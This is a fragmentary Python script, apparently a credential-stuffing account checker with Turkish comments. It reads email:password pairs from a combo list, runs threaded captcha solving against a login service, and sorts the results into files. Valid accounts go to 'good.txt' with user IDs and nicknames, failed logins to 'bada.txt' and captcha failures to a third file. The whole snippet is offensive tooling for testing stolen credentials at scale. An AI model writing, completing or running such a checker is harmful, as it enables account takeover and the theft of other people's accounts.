...
def check(email, sifre, ticket, randstr):
    ...
    if nick != "Yok" and userid != "Yok":
        try:
            ...
            nick = ""
        print(Fore.BLUE + f"[+] Id: {userid} | Nick: {nick} | Email: {email} | Pass: {sifre}")
        with open('good.txt', 'a', encoding='utf-8') as file:
            file.write(email + ":" + sifre + ':' + str(nick) + ':' + str(userid) + '\n')
        calisan += 1

    elif '"verify captcha fail!"' in istektext:
        with open('captcha_fail.txt', 'a', encoding='utf-8') as file:
            file.write(email + ":" + sifre + '\n')
        print(Fore.RED + f"captcha başarısız")

    elif nick == "Yok" and userid == "Yok":
        with open('bada.txt', 'a', encoding='utf-8') as file:
            file.write(email + ":" + sifre + '\n')
...
def combosec(threads_check_accs):
    ...
    f = 'combo_list.txt'
    try:
        with open(f, 'r', encoding='utf-8') as file:  # UTF-8 kodlamasını belirtin
...
if __name__ == "__main__":
    threads_solver_captcha = 25
    threads_check_accs = 5
